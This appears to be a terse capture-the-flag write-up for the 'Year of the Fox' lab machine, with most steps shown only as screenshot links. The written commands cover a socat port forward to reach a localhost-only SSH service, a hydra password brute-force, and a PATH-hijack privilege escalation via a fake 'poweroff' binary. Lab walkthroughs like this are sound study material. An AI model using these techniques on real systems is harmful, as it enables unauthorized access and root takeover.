# Year of the Fox

- RCE Identification and exploitation

    ![Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/Untitled.png](Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/Untitled.png)

- Exploitaion

    ![Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/Untitled%201.png](Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/Untitled%201.png)

Port Forwarding 

- POC

    >> `tcp 0 0 127.0.0.1:22 0.0.0.0:* LISTEN -` 

    >> `netstat -tulw` shows `localhost:ssh`

    >> check `/etc/ssh/sshd_config` → shows `Listen Adress: 127.0.0.1, Allow User: Fox`

- Command to forward port 22 to 8001

    >> `socat tcp-listen:8001,reuseaddr,fork tcp:localhost:22` 

- Command to bruteforce Fox passwd

    >> `hydra -l user -P pss.txt -s 8081 <ip> -t 4 -V`

    ![Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/scr-200820-1711-51.png](Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/scr-200820-1711-51.png)

    ![Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/scr-200820-1713-47.png](Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/scr-200820-1713-47.png)

- Root

    >> Identification

    ![Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/Untitled%202.png](Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/Untitled%202.png)

    >> Reversing Gets us (Path is not specified)

    ![Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/Untitled%203.png](Year%20of%20the%20Fox%20d3d812bf669645a99c2b817c95f5c9ec/Untitled%203.png)

    >> Exploitaion

      >> `cp /bin/bash /tmp/poweroff`

      >> `export PATH=/tmp:$PATH`